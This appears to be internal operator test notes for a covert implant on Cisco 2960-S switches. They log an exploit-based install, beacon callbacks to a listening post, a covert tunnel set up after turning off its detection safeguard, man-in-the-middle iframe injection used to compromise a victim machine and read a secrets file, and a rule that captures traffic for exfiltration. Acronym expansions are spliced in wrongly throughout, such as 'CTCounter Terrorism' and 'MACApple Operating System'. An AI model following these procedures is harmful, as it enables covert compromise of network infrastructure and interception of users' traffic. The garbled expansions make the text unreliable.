Aquaman-5h-Without-Snooping Test Notes
Xetron redelivered Aquaman-5h without snooping as an interim solution to EAREnterprise Archive 5244.  Plan is to run through all tests from previous Aquaman-5h testing, as well as verify that the bug from EAREnterprise Archive 5244 is not reproducible.
Testing Summary

2960S crashes and reloads if show stacks issued during a reinstall of hg (after initial install with leave_behind and uninstall)
Identified 2 things in show tech that need to be checked
hg uninstall causes output in show platform tcam util asic all values to change
remote command all show vtp status - noticed difference in showtech, haven't been able to get consistent results, not sure this is an issue yet


Confirmed snoop not enabled and EAREnterprise Archive 5244 no longer observed

Progress / Notes

Run through HG Base Smoke Tests
Install/Uninstall without leave-behind
Establish baseline values for clean target device - skipped because we already have that data from previous testing
IAC attack - successful, received codes were 125, 60, 159 which are in the readme
Edited target-aliases to use target address 172.31.255.14
Edited target-aliases to use correct proc_id


HG upload - hg_start, left 1s delay between packets
HG uploaded successfully - result good
Establish CTCounter Terrorism Session with HG according to readme
Edit Aquaman-5h.txt hostfile - set listening interface of flux node to eth0 and IP to trigger to 192.168.21.10 (Seeds host)
Ran ./prep-ct.sh
Started CutThroat ./cutthroat ilm_hg.so - listening on 443 and trigger windows
Trigger implant - beacon call_base_back https  172.20.12.22 443 -ii 192.168.21.10 -im 0050.5688.256d -iv 1 -mi 0011.bb89.21c40011.bb89.21c4 is MACApple Operating System address of 192.168.21.1

Successful HG comms


Uninstall according to readme
device uninstall_hg -mp -f - Successful
Memory back down, no syslog messages, no crash




Install/Uninstall with leave-behind
Reloaded switch to start with a clean switch

Successful HG comms


Uninstall according to readme - successful, no anamolies seen
Did broad on remote - ok
hg_start to reinstall
While hg was reinstalling, i typed show stacks on switch - 1s later the switch crashed with the following error:Instruction Access Exception (0x0400)!

Not sure if this was related to entering show stacks whlie hg reinstall taking place or if that was a coincidence


Attempt to reproduce the crash
SSHIAC attack
Changed interpacket time to 0.1s
hg_start_leave_behind - successful
Establish CTCounter Terrorism Session
Uninstall according to readme - successful, no anamolies seen
hg_start to reinstallNo show commands entered - successful reinstall

Establish CTCounter Terrorism Session
Uninstall hg - successful
SSHIAC attack
hg_start_leave_behind to reintsall
this time, enter show stacks during install
no crashes - output of show stacks does show the artifacts, this is a known issue


Could not establish comms - reloading switch and going to try to repeat again
Reloaded switch
SSHIAC attack
hg_start_leave_behind
Establish CTCounter Terrorism session
device hg_uninstall -mp -f
hg_start_leave_behind - i entered show stacks during install and it crashed again




Command and Control
Establish CTCounter Terrorism session and verify versions/capabilities
Reload switch to start with clean target
SSHIAC attack
hg_start
Established CTCounter Terrorism session
ilm show - ilm version 3.8.0
device get_uid - 1ce85d68a280

ilm refresh - success
module show - success - Trigger module running


Hit tab key to verify output of available commands
mitm present, collect present
dns show, web show, https show - startup delay set to 32850k days - no snoop
dns get_snooped_host_list_client 0 100 - no snooped hosts even though seeds running


Boundary TestRun through list in HG Base Smoke Test Procedure - all failed gracefully, did not attempt to start snoop



CI Profile
Collect output for comparison - collected output in new files, will compare to previous test output
29.66712 MB more Used memory with HG installed
Observed same spikes in CPU during SSHIAC attack, HG upload and SSLSecure Socket Layer handshake as observed in previous testing
No change to file system
Show tech - observed known show stacks and show controllers artifacts
Show tech after hg uninstall - output of show tech platform tcam util asic all has a higher number for one value - IPv4 security aces went from 36 to 284 for ASIC 0 and ASIC 1 
Show tech with hg - no output for remote command all show vtp status, whereas there is output for without hg and after hg uninstall.  need to test this further.



Added to Rancid and ran once with HG, then uninstalled hg, reloaded switch, and ran rancid again to compare
RANCID rev 1.3 with HG, rev 1.5 without - no differences


SMITE Smoke Test - following documented HG 3.3.0 SMITE Capability Smoke Test Procedure
Start with a clean, reloaded 2960-S
SSHIAC attack and HG install
Established CTCounter Terrorism session
Completed module control test - stop, start - did not complete module delete and reload test
Did not test module persistence
Created SMITE rule
Iframe is injected into web page, viewed in source URL
Able to attach in Windex and view secrets.txt
Deleted mitm rule - iframe no longer injected


Samsonite Test Case - Uninstall HG and re-attack
Reloaded 2960-S to start with a clean target device
Attacked with SSHIAC, installed HG and established comms
Attempted uninstall hg command device uninstall_hg -mp -f - then typed yes to confirm, result success.
Checked used memory on the target 2960-S and the memory has gone back to down normal level without HG installed (may be slight difference, need to do the math), no syslog messages, no CPU spike
Re-attacked using SSHIAC, installed HG, established HG comms - no anomalies
Uninstalled HG again using device uninstall_hg -mp -f - no anomalies
No syslogs
Used memory back to normal




Samsonite Test Case - Dropped connection during HG install
Reloaded 2960-S to start with a clean target device
Attacked with SSHIAC
Entered hg_start and after just a few chunks were sent, shut int g1/0/11 via console connection on 2960-S to simulate network outage
ICON-CT reported HG install failed
No syslog messages from switch
Used memory still shows higher than it should, but not as high as if HG were installed - 27657488 (b)
Issued no shut on 2960-S interface g1/0/11 to re-enable the connection
Entered hg_start on ICON-CT and HG successfully uploaded - used memory after successful install - 30524888 (b)


Re-test EAREnterprise Archive 5244
With HG installed, but no CTCounter Terrorism session, enter service network restart on Seeds host 10x
Did not see err-disable condition
Established CTCounter Terrorism session and enter service network restart on Seeds host 10x
Did not see err-disable condition


Samsonite Test Case - Attempt to install HG when HG already installed
Cannot initiate hg_start again via remote - reports comms failure
Attempted to re-attack with SSHIAC - seemed to go through normal SSHIAC install process, however at the end of the install, could not establish comms with remote
Broad didn't work
hg_start fails


CT session with HG active throughout


Samsonite Test Case - Enable MITMMan-In-The-Middle attack rule and execute system administrator commands
Enabled the SMITE MITMMan-In-The-Middle attack rule in HG
Performed the following with no anomalies observed
Cleared log buffer
Disable/re-enable logging
Multiple show commands - show vlan, mac-address table, memory, proc cpu, proc cpu hist, log,run
Write mem
Add/delete a user
Add/delete a VLAN


Verified that SMITE works by web browsing from Victim VMVirtual Machine - collected output from Wireshark running on Victim VMVirtual Machine which shows Iframe


Samsonite Test Case - Issue Cisco "test crash" command to test crash and generate a crashinfo
With HG installed, issued test crash and selected reason as software forced crash
Saved output of crashinfo file
Saved log messages seen upon reboot of switch in log buffer
Memory used had returned to normal levels for no HG


Without HG installed, repeated test crash - need to compare crashinfo
Issued "test crash" command with software forced crash as reason
Saved output of crashinfo file
Saved syslog messages seen up reboot of switch in log buffer - no additional error messages in files





 Samsonite Test Case - Perform core dump of 2960-S
Performed a write core and saved to TFTPFile transfer software server - both before and after HG install with comess
Also collected a write core from after hg uninstall
File sizes are exactly the same for the two core dumps


Going home - reloaded 2960-S switch right before i left, so it does not have HG.  Tomorrow, need to pick up with Test 32 from original Aquaman Test Notes page - testing smite through dualor tunnel.  HG is still installed on 2960#1, and I made a CTCounter Terrorism session with that one in the bottom left-hand workspace on ICON-CT.  Do not reload that 2960 or remove HG or else we will have to go through the process of modifying the tunnel.ini so that it won't drop tunnel when it detects tap ip active on network.  
OR, could go back complete Test number 25 - Performance tests, which I had skipped.
(Test 32 from original test) Trigger and Callback through a HG Tunnel running Aquaman-3h on 2960
Updated 2960#1 to 12.2(50)SE5 and implanted with Aquaman-3h delivery of HG --> Confirmed switch is running 12.2(50)SE5

Established comms with Aquaman-3h from ICON-CT on port 443 --> Re-established comms with 2960#1
On Listen window: ilm listen aquaman-3h.txt

On Trigger window: ilm trigger aquamen-3h.txtbeacon call_me_back https 443 -ii 192.168.44.39

Successfull SSLSecure Socket Layer handshake



Disabled setting in Aquaman-3h HG tunnel which will disable the tunnel if the tap IP becomes active
Edit hg/config/tunnel.ini and change DetectTAPSrcTraffic=Yes to No
From hg/config run ./config-tunnel ../cfs/000000004B8FAF63.cfg and note output and DetectTAPSrcTraffic = Yes
From hg/config run ./config-tunnel ../cfs/000000004B8FAF63.cfg tunnel.ini and note in the output that DetectTAPSrcTraffic has been changed to No
From hg/config run ./config-tunnel ../cfs/000000004B8FAF63.cfg and note output and DetectTAPSrcTraffic = No
From Aquaman-3h CutThroat, type file put cfs/000000004B8FAF63.cfg default:000000004B8FAF63.cfg in order to load the new setting up to HG

From Aquaman-3h CutThroat, type module restart default:CovertTunnel.mod to restart the moduleThis did not work initially and Xetron is aware of this problem.  To fix, try restarting again, and run ilm refresh.



Establish Dualor tunnel with tap IP 192.168.0.110
From /hg/tools/dualor/linux, run ./Dualor ../config/dualor-endpoint.ini and note that you get a message that CTCounter Terrorism is listening on port 444
From Aquaman-3h CutThroat, run tun init tools/dualor/config/dualor-callback.ini and note that the SSLSecure Socket Layer session establishes
Note that on ICON-CT VMVirtual Machine you know have a new interface called tap0 with an iP 192.168.0.110


Add a route to ICON-CT for 192.168.21.0/24 to use tap0 interface - route add -net 192.168.21.0/24 dev tap0
Move to Aquaman-5h setup - Edit aquaman-5h.txt Interface value under general settings to tap0, and set CommsH port to 445
Establish HG comms using "beacon call_base_back https 192.168.0.110 445 -ii 192.168.21.10 -im 0050.5688.256d -iv 1 -mi 0011.bb89.21c4"
Comms successfully established through Aquaman-3h tunnel
Configured mitm rule for SMITE as in tests above and successfully exploited Victim VMVirtual Machine and read secrets.txt from Windex
Viewed web page source code which showed the iframe with promo code.
Deleted MITMMan-In-The-Middle attack rule. Issued "mitm show" to confirm rule is deleted
Moved to Aquaman-3h screens. In Listen window, issued "tun show" to get tunnel ID. Then issued "tun close 7" with success. "tun show" command confirms no active tunnels. Issued "ifconfig" in a terminal to confirm "tap 0" interface is gone.
Edited ..aquaman-5h/hg/aquaman-5h.txt file to change interface back to "eth0" and port back to "443"


Samsonite Test Case - Create MITMMan-In-The-Middle attack rule for SMITE multiple times
Establish CTCounter Terrorism Session
Created the MITMMan-In-The-Middle attack rule twice in a row - command successful both times and two identical rules present in mitm show output
Created a third identical MITMMan-In-The-Middle attack rule - now there are three identical MITMMan-In-The-Middle attack rules - mitm show
Iframe injection on Victim VMVirtual Machine successful - only 1 Iframe injected
mitm status shows 1 session affected
Deleted the two additional rules and added a rule with same filter settings except different iframe string - only one iframe injected and it is for lowest numbered rule
Deleted the lowest numbered rule so now only 1 rule applied - iframe is injected that matches remaining rule
Noticed that in our test setup HTMLHypertext Markup Language we have two body tags, and we actually get two iframes injected - one after each body tag, which results in two shellterm connection ids in Windex
When multiple MITMMan-In-The-Middle attack rules are present for the same traffic, lowest numbered rule is the action performed


Samsonite Test Case - Reload FilterBroker.mod while mitm rule enabled
Created a mitm rule and verified functionality by viewing source on the Victim VM
On CutThroat session, entered module restart default:FilterBroker.mod
Issued module show and saw two copies running - one status ModuleStopped, one status ModuleRunning
Issued ilm refresh to attempt to clear the old copy of FilterBroker - however two copies still present in module show
Ran mitm show and found no rules - restarting the module had deleted our rule
Re-added a mitm rule and verified functionality by checking for the Iframe on Victim VM
Checked module show and found that now, only one copy - status ModuleRunning - is present



Smoke Test - Collect Capability
Establish CTCounter Terrorism Session with HG
Collect create 192.168.21.10 255.255.255.0 0 65535 X.X.X.XX (LVLT-GOGL-8-8-8[US]) 255.255.255.0 0 65535 tcp -en
This rule captures Seed traffic
In Listen window, observed "collect success received collected data" messages with job numbers
Collect status showed active sessions and captured sessions
Typed collect disable 8 to disable the collection rule
Collect status showed 0 bytes buffered
Viewed collected data in /Logs by converting to PCAPPacket capture format with ExfilParsh.sh - saw our seeds data


Samsonite Test - Reload 2960-S during HG install
Reloaded target 2960-S to start with a clean target device
Attacked with SSHIAC
Initiated HG install and reloaded the switch 18% complete
Did not see any unusual syslog messages, switch boots normally
Remote reports "FAILED retry (yes/up/down/fail)?  Selected fail and remote gives ERROR CODE 1.
Re-attack with IACInternational Access Code - successful and looks normal
Initiated HG install and allow installation to complete - Installation successful
Established HG comms successfully
device uninstall_hg -mp -f



Smoke Test - socket get_arp_survey_data
Reload switch to start with a clean Target Device
SSHIAC attack and install HG

Establish CTCounter Terrorism session

type socket get_arp_survey_data - results show 2 entries from our network (192.168.21.10 and 192.168.21.1), and show vlan 1
Tried to get more entries to show up by sending pings to and  from the Victim VMVirtual Machine (192.168.21.11) however no new ARPAddress Resolution Protocol entries
socket get_arp_responder_status shows ARPAddress Resolution Protocol responder enabled Yes
socket clear_arp_survey_data

Checked socket get_arp_survey_data again and only 1 entry now, eventually both re-appeared




IXIA Testing

With HG still loaded on 2960-S from last Friday, ran pre-defined test with a a mix of traffic at 75mbps rate.
(Test 1) Results = 715,397 attempted / 658,078 successful / 0 failed under "Application Transaction Rate". 2960-S CPU topped out at 11%
